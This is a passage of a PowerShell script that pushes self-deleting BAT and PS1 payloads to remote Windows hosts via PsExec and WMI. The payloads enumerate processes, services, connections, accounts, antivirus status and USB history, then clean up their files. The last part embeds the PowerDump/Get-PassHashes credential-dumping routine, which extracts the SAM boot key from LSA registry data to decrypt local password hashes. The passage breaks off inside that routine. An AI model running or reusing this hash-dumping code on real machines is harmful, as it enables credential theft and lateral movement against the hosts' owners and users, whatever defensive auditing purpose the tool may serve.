	if($j -eq $scan.TimeOut){"$((get-date).ToString('yyyy-MMM-dd hh:mm:ss')),$HostName,Collect Timed-out"| Add-Content "$($scan.TEMP_DIR)\ErrorLog.csv"}
}

[ScriptBlock] $LoggedOnUsers_SB = {
    param($RHost, $scan)
    $HostName=$RHost.split(",")[0]
	$HostIP=$RHost.split(",")[1]

	try{
		Get-WmiObject win32_ComputerSystem -ComputerName $HostIP -ErrorAction Stop|%{
			$scan.mtx.waitone() |Out-Null
			$_.Name+","+$_.UserName|Add-Content "$($scan.TEMP_DIR)\LoggedOnUsers.txt"
			$scan.mtx.ReleaseMutex()
		}
	} catch {
		continue
	}
}

[ScriptBlock] $PingSweepSB = {
	param($RHost, $scan)
	
	$ping = ping $RHost -n 1|select-string "TTL="
	$ping = $ping.tostring().split("=")[3]
	
	if($ping)
	{
		$scan.mtx.waitone() |Out-Null
		"$RHost,$ping"|Add-Content "$($scan.TEMP_DIR)\PingSweep.txt"
		$scan.mtx.ReleaseMutex()
	}
}

[ScriptBlock] $CleanUpSB = {

	param($RHost, $scan)
    $HostName = $RHost.split(",")[0]
	$HostIP = $RHost.split(",")[1]

	$ScriptFiles =
	"PSExecShellCode.bat",
	"PSExecShellCode.ps1"	
	$DataFiles = 
	"UserExeSearch",
	"USB_Enumeration",
	"AutoRunDisable",
	"StartUpPrograms",
	"ScheduledTasks",
	"RunningProcs",
	"Drivers",
	"Services",
	"Netstat",
	"InstalledSoftware",
	"NetworkShares",
	"HotFixData",
	"AntivirusStatus",
	"LocalAccounts",
	"ImageFileSearch",
	"VideoFileSearch",
	"ScriptFileSearch",
	"ExecutableFileSearch",
	"DataFileSearch",
	"PasswordFileSearch",
	"hashes",
	"HashDump"

	foreach($DataFile in $DataFiles){
		if(Test-Path "\\$HostIP\c$\${DataFile}392125281")
		{
			try {
				Remove-Item -Force "\\$HostIP\c$\${DataFile}392125281" -ErrorAction Stop
			} catch {
				$scan.mtx.waitone()|out-null
				"$((get-date).ToString('yyyy-MMM-dd hh:mm:ss')),$HostName,Data-File Removal Failed ($DataFile)"|Add-Content "$($scan.OUT_DIR)\CleanUpErrorLog.csv"
				$scan.mtx.ReleaseMutex()
			}
		}
	}
	foreach($ScriptFile in $ScriptFiles){
		if(Test-Path "\\$HostIP\c$\$ScriptFile")
		{
			try {
				Remove-Item -Force "\\$HostIP\c$\$ScriptFile" -ErrorAction Stop
			} catch {
				$scan.mtx.waitone()|out-null
				"$((get-date).ToString('yyyy-MMM-dd hh:mm:ss')),$HostName,Script-File Removal Failed ($ScriptFile)"|Add-Content "$($scan.OUT_DIR)\CleanUpErrorLog.csv"
				$scan.mtx.ReleaseMutex()
			}
		}
	}
}

#hash table to store variables used in scan and passed to script blocks
$scan = @{
	"TEMP_DIR"= $null
	"OUT_DIR"= $null
	"RemoteDataFile"= $null
	"BATCode"= $null
	"PS1Code"= $null
	"Throttle"= $null
	"Timeout" = $null
	"Creds"= $null
	"psexec"= $null
	"mtx"=$null
	"DomainName" = $null
	"Data" = $null
}

############################################
#	END Multi-threading script blocks
############################################


############################################
####	START Initialize Variables      ####
############################################

############################################
#START Script Blocks for Deployable payloads
############################################
$UserExeSearchCode_BAT1 = @'
@echo off
IF EXIST "C:\UserExeSearch392125281" DEL "C:\UserExeSearch392125281"
for /R "c:\documents and settings" %%f in (*.exe) do echo %COMPUTERNAME%,%%~nxf,%%~dpf >> "C:\UserExeSearch392125281"
(goto) 2>nul & del "%~f0"
'@
$UserExeSearchCode_PS1 = @'
if (Test-Path "C:\UserExeSearch392125281"){Remove-Item -Force "C:\UserExeSearch392125281"}
gci -Recurse -Force "c:\Users" -ErrorAction SilentlyContinue -Include *.exe -Exclude "Application Data" 2>$null | 
foreach {$env:COMPUTERNAME+","+$_.name+","+$_.Directoryname}|
Out-file "C:\UserExeSearch392125281"
Remove-Item -Force "C:\PSExecShellCode.ps1"
'@
$StartUpProgramsCode_BAT = @'
@echo off
IF EXIST "C:\StartUpPrograms392125281" DEL "C:\StartUpPrograms392125281"
setlocal enabledelayedexpansion
for /F "tokens=1-2* delims==" %%A in ('wmic startup get command^,user^,description^,location /format:list ^|findstr .') DO (
	set /a var=!var!+1
	set str=%%B
	IF !var!==1 set Command=!str:~0,-1!
	IF !var!==2 set Description=!str:~0,-1!
	IF !var!==3 Set Location=!str:~0,-1!
	IF !var!==4 (
		set User=!str:~0,-1!
		set Command=!Command:,=!
		IF "!Command!"==",=" set Command=
		set Description=!Description:,=!
		IF "!Description!"==",=" set Description=
		echo %COMPUTERNAME%,!Command!,!Description!,!Location!,!User! >> "C:\StartUpPrograms392125281"
		set /a var=0
	)
) 
(goto) 2>nul & del "%~f0"
'@
$StartUpProgramsCode_PS1 = @'
$ErrorActionPreference = Stop
if (Test-Path "C:\StartUpPrograms392125281"){Remove-Item -Force "C:\StartUpPrograms392125281"}
try{
Get-WmiObject Win32_startupcommand |
foreach {$env:COMPUTERNAME+","+$_.command+","+$_.description+","+$_.location+","+$_.user}|
Out-file "C:\StartUpPrograms392125281"
} catch {continue}
Remove-Item -Force "C:\PSExecShellCode.ps1"
'@
$RunningProcsCode_BAT = @'
@echo off
IF EXIST "C:\RunningProcs392125281" DEL "C:\RunningProcs392125281"
wmic process get name,executablepath /FORMAT:csv |findstr /v Node >> "C:\RunningProcs392125281"
(goto) 2>nul & del "%~f0"
'@
$RunningProcsCode_PS1 = @'
$ErrorActionPreference = Stop
if (Test-Path "C:\RunningProcs392125281"){Remove-Item -Force "C:\RunningProcs392125281"}
try{
Get-WmiObject Win32_process |
foreach {$env:COMPUTERNAME+","+$_.ExecutablePath+","+$_.Name}|
Out-file "C:\RunningProcs392125281"
} catch {continue}
Remove-Item -Force "C:\PSExecShellCode.ps1"
'@
$QueryDriversCode_BAT = @'
@echo off
IF EXIST "C:\Drivers392125281" DEL "C:\Drivers392125281"
wmic sysdriver get DisplayName, Name, State, Status, Started, Description /format:csv |findstr /v Node >> "C:\Drivers392125281"
(goto) 2>nul & del "%~f0"
'@
$QueryDriversCode_PS1 = @' 
$ErrorActionPreference = Stop
if (Test-Path "C:\Drivers392125281"){Remove-Item -Force "C:\Drivers392125281"}
try{
Get-WmiObject Win32_systemdriver | 
foreach {$env:COMPUTERNAME+","+$_.Description+","+$_.DisplayName+","+$_.Name+","+$_.started+","+$_.state+","+$_.status}|
Out-file "C:\Drivers392125281"
} catch {continue}
Remove-Item -Force "C:\PSExecShellCode.ps1"
'@
$QueryServicesCode_BAT = @'
@echo off
IF EXIST "C:\Services392125281" DEL "C:\Services392125281"
wmic service get Name,StartMode,State,Status /format:csv |findstr /v Node >> "C:\Services392125281"
(goto) 2>nul & del "%~f0"
'@
$QueryServicesCode_PS1 = @'
$ErrorActionPreference = Stop
if (Test-Path "C:\Services392125281"){Remove-Item -Force "C:\Services392125281"}
try{
Get-WmiObject Win32_service |
foreach {$env:COMPUTERNAME+","+$_.Name+","+$_.StartMode+","+$_.state+","+$_.status}|
Out-file "C:\Services392125281"
} catch {continue}
Remove-Item -Force "C:\PSExecShellCode.ps1"
'@
$NetstatCode_BAT = @'
@echo off
IF EXIST "C:\Netstat392125281" DEL "C:\Netstat392125281"
for /F "tokens=1-7 delims=: " %%A in ('netstat -ano -p TCP ^|findstr TCP') do (
	wmic process where "ProcessID=%%G" get name 2>nul|findstr /v Name > temp185236497
	set /p PROC=<temp185236497
	setlocal ENABLEDELAYEDEXPANSION
	echo %COMPUTERNAME%,%%B,%%C,%%D,%%E,%%F,!PROC!,%%G >> "C:\Netstat392125281"
	endlocal
 	del temp185236497
)
(goto) 2>nul & del "%~f0"
'@
$NetstatCode_PS1 = @'
$ErrorActionPreference = Stop
if (Test-Path "C:\Netstat392125281"){Remove-Item -Force "C:\Netstat392125281"}
try{
(netstat -ano | Select-String -Pattern '\s+(TCP)' | 
ForEach-Object {$env:COMPUTERNAME + ((($_ -replace '\s+', ',') -replace '\[::\]', '') -replace ':', ',')}) | 
%{ $_.Split(',')[0] +","+ $_.Split(',')[2] +","+ 
$_.Split(',')[3] +","+ $_.Split(',')[4] +","+ $_.Split(',')[5] +","+
$_.Split(',')[6] +","+ $(Get-Process -Id $($_.Split(',')[7])).Name +","+ $_.Split(',')[7] }|
Out-file "C:\Netstat392125281"
} catch {continue}
Remove-Item -Force "C:\PSExecShellCode.ps1"
'@
$InstalledSoftwareCode_BAT = @'
@echo off
IF EXIST "C:\InstalledSoftware392125281" DEL "C:\InstalledSoftware392125281"
setlocal enabledelayedexpansion
for /F "tokens=1-2* delims==" %%A in ('wmic product get Name^, Vendor^, Version^, InstallDate^, InstallLocation /format:List ^|findstr .') DO (
	set /a var=!var!+1
	set str=%%B
	IF !var!==1 set InstallDate=!str:~0,-1!
	IF !var!==2 set InstallLocation=!str:~0,-1!
	IF !var!==3 Set Name=!str:~0,-1!
	IF !var!==4 set Vendor=!str:~0,-1!
	IF !var!==5 (
		set Version=!str:~0,-1!
		set Name=!Name:,=!
		IF "!Name!"==",=" set Name=
		set Vendor=!Vendor:,=!
		IF "!Vendor!"==",=" set Vendor=
		echo %COMPUTERNAME%,!InstallDate!,!InstallLocation!,!Name!,!Vendor!,!Version! >> "C:\InstalledSoftware392125281"
		set /a var=0
	)
) 
endlocal 
(goto) 2>nul & del "%~f0"
'@
$InstalledSoftwareCode_PS1 = @'
$ErrorActionPreference = Stop
if (Test-Path "C:\InstalledSoftware392125281"){Remove-Item -Force "C:\InstalledSoftware392125281"}
try{
Get-WmiObject win32_product|
foreach {$env:COMPUTERNAME+","+$_.InstallDate+","+$_.InstallLocation+","+($_.Name -replace ',', '')+","+($_.Vendor -replace ',', '')+","+$_.version}|
Out-file "C:\InstalledSoftware392125281"
} catch {continue}
Remove-Item -Force "C:\PSExecShellCode.ps1"
'@
$SharesCode_BAT = @'
@echo off
IF EXIST "C:\NetworkShares392125281" DEL "C:\NetworkShares392125281"
wmic share list brief /format:csv |findstr /v Node >> "C:\NetworkShares392125281"
(goto) 2>nul & del "%~f0"
'@
$SharesCode_PS1 = @'
$ErrorActionPreference = Stop
if (Test-Path "C:\NetworkShares392125281"){Remove-Item -Force "C:\NetworkShares392125281"}
try{
Get-WmiObject win32_share |
foreach {$env:COMPUTERNAME+","+$_.description+","+$_.Name+","+$_.Path}|
Out-file "C:\NetworkShares392125281"
} catch {continue}
Remove-Item -Force "C:\PSExecShellCode.ps1"
'@
$HotFixCode_BAT = @'
@echo off
IF EXIST "C:\HotFixData392125281" DEL "C:\HotFixData392125281"
wmic qfe get Description,HotFixID,InstalledBy,InstalledOn /format:csv |findstr /v /c:Node /c:"File 1" >> "C:\HotFixData392125281"
(goto) 2>nul & del "%~f0"
'@
$HotFixCode_PS1 = @'
$ErrorActionPreference = Stop
if (Test-Path "C:\HotFixData392125281"){Remove-Item -Force "C:\HotFixData392125281"}
try{
Get-Hotfix|
foreach {$env:COMPUTERNAME+","+$_.Description+","+$_.HotFixID+","+$_.InstalledBy+","+$_.InstalledOn}|
Out-file "C:\HotFixData392125281"
} catch {continue}
Remove-Item -Force "C:\PSExecShellCode.ps1"
'@
$AntivirusStatusCode_BAT = @'
@echo off
IF EXIST "C:\AntivirusStatus392125281" DEL "C:\AntivirusStatus392125281"
WMIC /Namespace:\\root\SecurityCenter Path AntiVirusProduct get displayName,versionNumber,onAccessScanningEnabled,productUptoDate /format:csv |findstr /v Node >> "C:\AntivirusStatus392125281"
(goto) 2>nul & del "%~f0"
'@
$AntivirusStatusCode_PS1 = @'
$ErrorActionPreference = Stop
if (Test-Path "C:\AntivirusStatus392125281"){Remove-Item -Force "C:\AntivirusStatus392125281"}
try{
Get-WmiObject -Namespace root\SecurityCenter2 -Class AntiVirusProduct |%{
	if(-not $_.versionNumber){
		$version = (Get-Command $_.pathToSignedProductExe.tostring()).FileVersionInfo.ProductVersion
		if(-not $version){
		$version = (Get-Command $_.pathToSignedReportingExe.tostring()).FileVersionInfo.ProductVersion
		}
	} else {$version = $_.versionNumber}
	$env:COMPUTERNAME+","+$_.displayName+","+$_.productstate+","+$version
	} | %{
		$ProductCode=$_.Split(',')[2]
		$rtstatus = ([convert]::toInt32("$ProductCode").tostring("X6")).substring(2, 2)
		$defstatus = ([convert]::toInt32("$ProductCode").tostring("X6")).substring(4, 2)
		if ($rtstatus -eq "10"){$rtstatus = $true}
		else {$rtstatus = $false}
		if ($defstatus -eq "00"){$defstatus=$true}
		else{$defstatus=$false}
		$_.Split(',')[0]+","+$_.Split(',')[1]+","+$rtstatus+","+$defstatus+","+$_.Split(',')[3]
	}|Out-file "C:\AntivirusStatus392125281"
} catch {continue}
Remove-Item -Force "C:\PSExecShellCode.ps1"
'@
$AutoRunDisableCode_BAT = @'
@echo off
IF EXIST "C:\AutoRunDisable392125281" DEL "C:\AutoRunDisable392125281"
for /F "tokens=1-3" %%A in ('reg query HKEY_LOCAL_MACHINE\software\microsoft\windows\currentversion\policies\explorer ^|findstr NoDriveTypeAutoRun') do (
	IF %%C EQU 0xFF (echo %COMPUTERNAME%,TRUE )  ELSE echo %COMPUTERNAME%,FALSE
) >> "C:\AutoRunDisable392125281"
(goto) 2>nul & del "%~f0"
'@
$AutoRunDisableCode_PS1=@'
$ErrorActionPreference = Stop
if (Test-Path "C:\AutoRunDisable392125281"){Remove-Item -Force "C:\AutoRunDisable392125281"}
try{
$NoAutoRun = (Get-ItemProperty -Path HKLM:software\microsoft\windows\currentversion\policies\explorer -Name NoAutoRun).NoAutoRun
if($NoAutoRun){$env:COMPUTERNAME+",TRUE"|Out-file "C:\AutoRunDisable392125281"}
else{$env:COMPUTERNAME+",FALSE"|Out-file "C:\AutoRunDisable392125281"}
} catch {continue}
Remove-Item -Force "C:\PSExecShellCode.ps1"
'@
$LocalAccountsCode_BAT = @'
@echo off
IF EXIST "C:\LocalAccounts392125281" DEL "C:\LocalAccounts392125281"
for /F "tokens=*" %%G in ('net users^|findstr /v /c:"User accounts" /c:"command completed" /c:"----"') do @For %%U in (%%G) DO (
	setlocal ENABLEDELAYEDEXPANSION
	for /f  "tokens=1-2*" %%C IN ('net user "%%U" ^|findstr /c:"Account active" /c:"Last logon"') DO (
		set /a var=!var!+1
		if !var!==1 (
			set data=%%E
		) ELSE (
			echo %COMPUTERNAME%,%%U,!data!,%%E
		)
	)2>nul
	endlocal
) >> "C:\LocalAccounts392125281"
(goto) 2>nul & del "%~f0"
'@
$LocalAccountsCode_PS1=@'
$ErrorActionPreference = Stop
if (Test-Path "C:\LocalAccounts392125281"){Remove-Item -Force "C:\LocalAccounts392125281"}
$adsi = [ADSI]"WinNT://$env:COMPUTERNAME"
$Users = $adsi.Children  | where {$_.SchemaClassName  -eq 'user'}
$Users|%{
	$active = Net user $_.name|select-string "Account active"
	if($active|Select-String "No"){$active="No"}
	elseif($active|Select-String "Yes"){$active="Yes"}
	try{
		$login=","+($_.LastLogin).Value
	} catch {
        $login=",Never"
    }
	$env:COMPUTERNAME+","+$_.Name+","+$active+$login
}|Out-file "C:\LocalAccounts392125281"
Remove-Item -Force "C:\PSExecShellCode.ps1"
'@
$ScheduledTasksCode_BAT = @'
@echo off
IF EXIST "C:\ScheduledTasks392125281" DEL "C:\ScheduledTasks392125281"
wmic job list brief /format:csv 2>nul|findstr /v Node >> "C:\ScheduledTasks392125281"
(goto) 2>nul & del "%~f0"
'@
$ScheduledTasksCode_PS1 = @'
$ErrorActionPreference = Stop
if (Test-Path "C:\ScheduledTasks392125281"){Remove-Item -Force "C:\ScheduledTasks392125281"}
try{
Get-WmiObject win32_scheduledjob |
foreach {$env:COMPUTERNAME+","+$_.command+","+$_.JobId+","+$_.Name+","+$_.Owner+","+$_.Priority}|
Out-file "C:\ScheduledTasks392125281"
} catch {continue}
Remove-Item -Force "C:\PSExecShellCode.ps1"
'@
$USB_EnumerationCode_BAT = @'
@echo off
IF EXIST "C:\USB_Enumeration392125281" DEL "C:\USB_Enumeration392125281"
setlocal enabledelayedexpansion
for /f %%A in ('reg query hklm\system\currentcontrolset\enum\usb') DO (	
	for /f %%B IN ('reg query "%%A"') DO (
		for /f  "tokens=1-2*" %%C IN ('reg query "%%B" /v FriendlyName') DO (
			set FriendlyName=%%E
			IF "!FriendlyName!" NEQ "" set FriendlyName=!FriendlyName:,=!
		)2>nul
		for /f  "tokens=1-2*" %%C IN ('reg query "%%B" /v DeviceDesc') DO (	
			set DeviceDescr=%%E
			IF "!DeviceDescr!" NEQ "" set DeviceDescr=!DeviceDescr:,=!
		)2>nul
		IF "%%B" NEQ "" (
			IF "!DeviceDescr!" NEQ "" (
				echo %COMPUTERNAME%,!DeviceDescr!,!FriendlyName!,%%B >> "C:\USB_Enumeration392125281"
			) ELSE (
				IF "!FriendlyName!" NEQ "" (
					echo %COMPUTERNAME%,!DeviceDescr!,!FriendlyName!,%%B >> "C:\USB_Enumeration392125281"
				)
			)
		)
	)2>nul
)2>nul
for /f %%A in ('reg query hklm\system\currentcontrolset\enum\usbstor') DO (	
	for /f %%B IN ('reg query "%%A"') DO (	
		for /f  "tokens=1-2*" %%C IN ('reg query "%%B" /v FriendlyName') DO (
			set FriendlyName=%%E
			IF "!FriendlyName!" NEQ "" set FriendlyName=!FriendlyName:,=!
		)2>nul
		for /f  "tokens=1-2*" %%C IN ('reg query "%%B" /v DeviceDesc') DO (	
			set DeviceDescr=%%E
			IF "!DeviceDescr!" NEQ "" set DeviceDescr=!DeviceDescr:,=!
		)2>nul
		IF "%%B" NEQ "" (
			IF "!DeviceDescr!" NEQ "" (
				echo %COMPUTERNAME%,!DeviceDescr!,!FriendlyName!,%%B >> "C:\USB_Enumeration392125281"
			) ELSE (
				IF "!FriendlyName!" NEQ "" (
					echo %COMPUTERNAME%,!DeviceDescr!,!FriendlyName!,%%B >> "C:\USB_Enumeration392125281"
				)
			)
		)
	)2>nul
)2>nul
endlocal
(goto) 2>nul & del "%~f0"
'@
$USB_EnumerationCode_PS1 = @'
$ErrorActionPreference = Stop
if (Test-Path "C:\USB_Enumeration392125281"){Remove-Item -Force "C:\USB_Enumeration392125281"}
$keys=@()
reg query hklm\system | Select-String "control" | %{
    reg query "$_\enum\usb"|where{$_}|%{
        $keys += reg query $_ |where{$_}
    }
	reg query "$_\enum\usbstor"|where{$_}|%{
        $keys += reg query $_ |where{$_}
    }
}
$keys|%{
    $key = $_ -replace "HKEY_LOCAL_MACHINE", "HKLM:" 
	if ((Get-Item -Path "$key").property|Select-String DeviceDesc)
	{
		$DevDesc = (Get-ItemProperty -Path "$key" -Name DeviceDesc).DeviceDesc
	}
	else {$DevDesc = ""}
	if ((Get-Item -Path "$key").property|Select-String FriendlyName)
	{
		$FriendlyName = (Get-ItemProperty -Path "$key" -Name FriendlyName).FriendlyName 
	}
	else {$FriendlyName = ""}
    if ($DevDesc|select-String ";"){$DevDesc = (Get-ItemProperty -Path "$key" -Name DeviceDesc).DeviceDesc.split(";")[1]}
	if ($FriendlyName|select-String ";"){$FriendlyName = (Get-ItemProperty -Path "$key" -Name FriendlyName).FriendlyName.split(";")[1]}    
	if($DevDesc -or $FriendlyName)
	{
		$env:COMPUTERNAME+","+$DevDesc+","+$FriendlyName+","+$_ | Add-Content "C:\USB_Enumeration392125281"
	}
}
Remove-Item -Force "C:\PSExecShellCode.ps1"
'@

$FileHasher = @'
function GetHash($file){
$fs = new-object System.IO.FileStream $file, “Open”, “Read”, “Read”
$algo = [type]"System.Security.Cryptography.MD5"
$crypto = $algo::Create()
$hash = [BitConverter]::ToString($crypto.ComputeHash($fs)).Replace("-", "")
#$hash = $crypto.ComputeHash($fs)
$fs.Close()
$hash
}

Get-ChildItem -path "C:\" -Include "*.exe", "*.dll", "*.sys" -Recurse -Force -ErrorAction SilentlyContinue|
? { $_.FullName -notmatch 'Application Data' }| %{ 
	$_.Name+","+(GetHash $_.FullName)|Add-Content  "C:\hashes392125281"
}
Remove-Item -Force "C:\PSExecShellCode.ps1"
'@

[ScriptBlock] $PowerDump = {
function Get-PassHashes {  
<#  
http://www.labofapenetrationtester.com/2013/05/poshing-hashes-part-2.html?showComment=1386725874167#c8513980725823764060 
https://github.com/samratashok/nishang 
#>  
[CmdletBinding()] 
Param () 
  
#######################################powerdump written by David Kennedy######################################### 
function LoadApi 
{ 
$oldErrorAction = $global:ErrorActionPreference; 
$global:ErrorActionPreference = "SilentlyContinue"; 
$test = [PowerDump.Native]; 
$global:ErrorActionPreference = $oldErrorAction; 
if ($test) 
{ 
# already loaded 
return; 
} 
  
$code = @' 
using System; 
using System.Security.Cryptography; 
using System.Runtime.InteropServices; 
using System.Text; 
 
namespace PowerDump 
{ 
public class Native 
{ 
[DllImport("advapi32.dll", CharSet = CharSet.Auto)] 
public static extern int RegOpenKeyEx( 
int hKey, 
string subKey, 
int ulOptions, 
int samDesired, 
out int hkResult); 
 
[DllImport("advapi32.dll", EntryPoint = "RegEnumKeyEx")] 
extern public static int RegEnumKeyEx( 
int hkey, 
int index, 
StringBuilder lpName, 
ref int lpcbName, 
int reserved, 
StringBuilder lpClass, 
ref int lpcbClass, 
out long lpftLastWriteTime); 
 
[DllImport("advapi32.dll", EntryPoint="RegQueryInfoKey", CallingConvention=CallingConvention.Winapi, SetLastError=true)] 
extern public static int RegQueryInfoKey( 
int hkey, 
StringBuilder lpClass, 
ref int lpcbClass, 
int lpReserved, 
out int lpcSubKeys, 
out int lpcbMaxSubKeyLen, 
out int lpcbMaxClassLen, 
out int lpcValues, 
out int lpcbMaxValueNameLen, 
out int lpcbMaxValueLen, 
out int lpcbSecurityDescriptor, 
IntPtr lpftLastWriteTime); 
  
[DllImport("advapi32.dll", SetLastError=true)] 
public static extern int RegCloseKey( 
int hKey); 
  
} 
} // end namespace PowerDump 
  
public class Shift { 
public static int Right(int x, int count) { return x >> count; } 
public static uint Right(uint x, int count) { return x >> count; } 
public static long Right(long x, int count) { return x >> count; } 
public static ulong Right(ulong x, int count) { return x >> count; } 
public static int Left(int x, int count) { return x << count; } 
public static uint Left(uint x, int count) { return x << count; } 
public static long Left(long x, int count) { return x << count; } 
public static ulong Left(ulong x, int count) { return x << count; } 
}
'@ 
  
$provider = New-Object Microsoft.CSharp.CSharpCodeProvider 
$dllName = [PsObject].Assembly.Location 
$compilerParameters = New-Object System.CodeDom.Compiler.CompilerParameters 
$assemblies = @("System.dll", $dllName) 
$compilerParameters.ReferencedAssemblies.AddRange($assemblies) 
$compilerParameters.GenerateInMemory = $true 
$compilerResults = $provider.CompileAssemblyFromSource($compilerParameters, $code) 
if($compilerResults.Errors.Count -gt 0) { 
$compilerResults.Errors | % { Write-Error ("{0}:`t{1}" -f $_.Line,$_.ErrorText) } 
} 
  
} 
  
$antpassword = [Text.Encoding]::ASCII.GetBytes("NTPASSWORD`0"); 
$almpassword = [Text.Encoding]::ASCII.GetBytes("LMPASSWORD`0"); 
$empty_lm = [byte[]]@(0xaa,0xd3,0xb4,0x35,0xb5,0x14,0x04,0xee,0xaa,0xd3,0xb4,0x35,0xb5,0x14,0x04,0xee); 
$empty_nt = [byte[]]@(0x31,0xd6,0xcf,0xe0,0xd1,0x6a,0xe9,0x31,0xb7,0x3c,0x59,0xd7,0xe0,0xc0,0x89,0xc0); 
$odd_parity = @( 
1, 1, 2, 2, 4, 4, 7, 7, 8, 8, 11, 11, 13, 13, 14, 14, 
16, 16, 19, 19, 21, 21, 22, 22, 25, 25, 26, 26, 28, 28, 31, 31, 
32, 32, 35, 35, 37, 37, 38, 38, 41, 41, 42, 42, 44, 44, 47, 47, 
49, 49, 50, 50, 52, 52, 55, 55, 56, 56, 59, 59, 61, 61, 62, 62, 
64, 64, 67, 67, 69, 69, 70, 70, 73, 73, 74, 74, 76, 76, 79, 79, 
81, 81, 82, 82, 84, 84, 87, 87, 88, 88, 91, 91, 93, 93, 94, 94, 
97, 97, 98, 98,100,100,103,103,104,104,107,107,109,109,110,110, 
112,112,115,115,117,117,118,118,121,121,122,122,124,124,127,127, 
128,128,131,131,133,133,134,134,137,137,138,138,140,140,143,143, 
145,145,146,146,148,148,151,151,152,152,155,155,157,157,158,158, 
161,161,162,162,164,164,167,167,168,168,171,171,173,173,174,174, 
176,176,179,179,181,181,182,182,185,185,186,186,188,188,191,191, 
193,193,194,194,196,196,199,199,200,200,203,203,205,205,206,206, 
208,208,211,211,213,213,214,214,217,217,218,218,220,220,223,223, 
224,224,227,227,229,229,230,230,233,233,234,234,236,236,239,239, 
241,241,242,242,244,244,247,247,248,248,251,251,253,253,254,254 
); 
 
function sid_to_key($sid) 
{ 
$s1 = @(); 
$s1 += [char]($sid -band 0xFF); 
$s1 += [char]([Shift]::Right($sid,8) -band 0xFF); 
$s1 += [char]([Shift]::Right($sid,16) -band 0xFF); 
$s1 += [char]([Shift]::Right($sid,24) -band 0xFF); 
$s1 += $s1[0]; 
$s1 += $s1[1]; 
$s1 += $s1[2]; 
$s2 = @(); 
$s2 += $s1[3]; $s2 += $s1[0]; $s2 += $s1[1]; $s2 += $s1[2]; 
$s2 += $s2[0]; $s2 += $s2[1]; $s2 += $s2[2]; 
return ,((str_to_key $s1),(str_to_key $s2)); 
} 
 
function str_to_key($s) 
{ 
$key = @(); 
$key += [Shift]::Right([int]($s[0]), 1 ); 
$key += [Shift]::Left( $([int]($s[0]) -band 0x01), 6) -bor [Shift]::Right([int]($s[1]),2); 
$key += [Shift]::Left( $([int]($s[1]) -band 0x03), 5) -bor [Shift]::Right([int]($s[2]),3); 
$key += [Shift]::Left( $([int]($s[2]) -band 0x07), 4) -bor [Shift]::Right([int]($s[3]),4); 
$key += [Shift]::Left( $([int]($s[3]) -band 0x0F), 3) -bor [Shift]::Right([int]($s[4]),5); 
$key += [Shift]::Left( $([int]($s[4]) -band 0x1F), 2) -bor [Shift]::Right([int]($s[5]),6); 
$key += [Shift]::Left( $([int]($s[5]) -band 0x3F), 1) -bor [Shift]::Right([int]($s[6]),7); 
$key += $([int]($s[6]) -band 0x7F); 
0..7 | %{ 
$key[$_] = [Shift]::Left($key[$_], 1); 
$key[$_] = $odd_parity[$key[$_]]; 
} 
return ,$key; 
} 
 
function NewRC4([byte[]]$key) 
{ 
return new-object Object | 
Add-Member NoteProperty key $key -PassThru | 
Add-Member NoteProperty S $null -PassThru | 
Add-Member ScriptMethod init { 
if (-not $this.S) 
{ 
[byte[]]$this.S = 0..255; 
0..255 | % -begin{[long]$j=0;}{ 
$j = ($j + $this.key[$($_ % $this.key.Length)] + $this.S[$_]) % $this.S.Length; 
$temp = $this.S[$_]; $this.S[$_] = $this.S[$j]; $this.S[$j] = $temp; 
} 
} 
} -PassThru | 
Add-Member ScriptMethod "encrypt" { 
$data = $args[0]; 
$this.init(); 
$outbuf = new-object byte[] $($data.Length); 
$S2 = $this.S[0..$this.S.Length]; 
0..$($data.Length-1) | % -begin{$i=0;$j=0;} { 
$i = ($i+1) % $S2.Length; 
$j = ($j + $S2[$i]) % $S2.Length; 
$temp = $S2[$i];$S2[$i] = $S2[$j];$S2[$j] = $temp; 
$a = $data[$_]; 
$b = $S2[ $($S2[$i]+$S2[$j]) % $S2.Length ]; 
$outbuf[$_] = ($a -bxor $b); 
} 
return ,$outbuf; 
} -PassThru 
} 
 
function des_encrypt([byte[]]$data, [byte[]]$key) 
{ 
return ,(des_transform $data $key $true) 
} 
 
function des_decrypt([byte[]]$data, [byte[]]$key) 
{ 
return ,(des_transform $data $key $false) 
} 
 
function des_transform([byte[]]$data, [byte[]]$key, $doEncrypt) 
{ 
$des = new-object Security.Cryptography.DESCryptoServiceProvider; 
$des.Mode = [Security.Cryptography.CipherMode]::ECB; 
$des.Padding = [Security.Cryptography.PaddingMode]::None; 
$des.Key = $key; 
$des.IV = $key; 
$transform = $null; 
if ($doEncrypt) {$transform = $des.CreateEncryptor();} 
else{$transform = $des.CreateDecryptor();} 
$result = $transform.TransformFinalBlock($data, 0, $data.Length); 
return ,$result; 
} 
 
function Get-RegKeyClass([string]$key, [string]$subkey) 
{ 
switch ($Key) { 
"HKCR" { $nKey = 0x80000000} #HK Classes Root 
"HKCU" { $nKey = 0x80000001} #HK Current User 
"HKLM" { $nKey = 0x80000002} #HK Local Machine 
"HKU" { $nKey = 0x80000003} #HK Users 
"HKCC" { $nKey = 0x80000005} #HK Current Config 
default { 
throw "Invalid Key. Use one of the following options HKCR, HKCU, HKLM, HKU, HKCC" 
} 
} 
$KEYQUERYVALUE = 0x1; 
$KEYREAD = 0x19; 
$KEYALLACCESS = 0x3F; 
$result = ""; 
[int]$hkey=0 
if (-not [PowerDump.Native]::RegOpenKeyEx($nkey,$subkey,0,$KEYREAD,[ref]$hkey)) 
{ 
$classVal = New-Object Text.Stringbuilder 1024 
[int]$len = 1024 
if (-not [PowerDump.Native]::RegQueryInfoKey($hkey,$classVal,[ref]$len,0,[ref]$null,[ref]$null, 
[ref]$null,[ref]$null,[ref]$null,[ref]$null,[ref]$null,0)) 
{ 
$result = $classVal.ToString() 
} 

[PowerDump.Native]::RegCloseKey($hkey) | Out-Null 
} 

return $result; 
} 
 
function Get-BootKey 
{ 
$s = [string]::Join("",$("JD","Skew1","GBG","Data" | %{Get-RegKeyClass "HKLM" "SYSTEM\CurrentControlSet\Control\Lsa\$_"})); 
$b = new-object byte[] $($s.Length/2); 
0..$($b.Length-1) | %{$b[$_] = [Convert]::ToByte($s.Substring($($_*2),2),16)} 
$b2 = new-object byte[] 16; 
0x8, 0x5, 0x4, 0x2, 0xb, 0x9, 0xd, 0x3, 0x0, 0x6, 0x1, 0xc, 0xe, 0xa, 0xf, 0x7 | % -begin{$i=0;}{$b2[$i]=$b[$_];$i++} 
return ,$b2; 
} 
 
function Get-HBootKey 
{ 
param([byte[]]$bootkey); 
